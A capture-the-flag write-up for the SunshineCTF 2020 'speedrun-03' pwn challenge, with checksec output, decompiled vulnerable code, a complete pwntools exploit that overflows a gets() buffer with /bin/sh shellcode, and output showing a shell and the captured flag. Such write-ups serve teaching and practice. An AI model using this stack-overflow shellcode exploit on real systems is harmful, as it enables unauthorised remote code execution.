# **speedrun-03**
## Task
nc chal.2020.sunshinectf.org 30003
File: chall_03
Tag: binary exploitation 

## Solution

### Checksec
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
* No canary + NX disable + RWX segments assume BOF shellcode
* System 64 bit
  
### Decompile with ghidra
```c
void vuln(void)
{
  char local_78 [112];
  
  printf("I\'ll make it: %p\n",local_78);
  gets(local_78);
  return;
}
```

`printf` leaks the address of the `local_78` so just write out the shellcode at that address then overflow the return address with shellcode's address

The shellcode address , We can craft by pwn module through `shellcraf` or find on the [Website shell storm](http://shell-storm.org/shellcode/)

### Exploit
```python
from pwn import *****
binary = context.binary = ELF('./chall_03')
p = remote('chal.2020.sunshinectf.org',30003)
p.sendlineafter('Just in time.\n','IxZ')

p.recvuntil('I\'ll make it: ')
addrshell = p.recvline().strip()
addr = int(addrshell,16)
payload = b''
payload += asm(shellcraft.sh())
print('len payload: ',len(payload))
payload += (0x78 - len(payload)) * b'a'
payload += p64(addr)
print('payload: ',payload)
p.sendline(payload)
p.interactive()
```

### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_03'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to chal.2020.sunshinectf.org on port 30003: Done
len payload:  48
payload:  b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf0\xf9\xaf\x9f\xff\x7f\x00\x00'
[*] Switching to interactive mode
$ ls
chall_03
flag.txt
$ cat flag.txt
sun{a-little-piece-of-heaven-26c8795afe7b3c49}
```